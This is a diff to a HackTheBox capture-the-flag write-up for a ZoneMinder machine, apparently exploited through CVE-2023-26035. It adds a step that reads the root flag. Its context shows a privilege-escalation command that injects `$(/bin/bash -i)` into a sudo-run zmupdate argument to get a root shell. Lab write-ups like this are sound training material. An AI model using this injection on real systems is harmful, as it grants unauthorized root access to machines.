@@ -56,5 +56,7 @@ With a [python script](https://github.com/rvizx/CVE-2023-26035) from GitHub I wa
 Using the version and the knowlage of google i found that you can use the `/usr/bin/zmupdate.pg` file to get root permission.
 - `sudo /usr/bin/zmupdate.pg --version=1 --user='$(/bin/bash -i)' --pass=YOUR_ZONEMINDER_PASSWORD`
 
+With our newly obtained root access we can read the root-flag with `cat /root/root.txt`
+
 #### Conclusion
 After having pwned the machine I can say it was a very interesting adventure. Sadly the machine was very unresponsive, which it to be expected for a free service but still their is quite some headroom left for [HackTheBox](https://app.hackthebox.com) to improve. GET PWNED BOZO!!
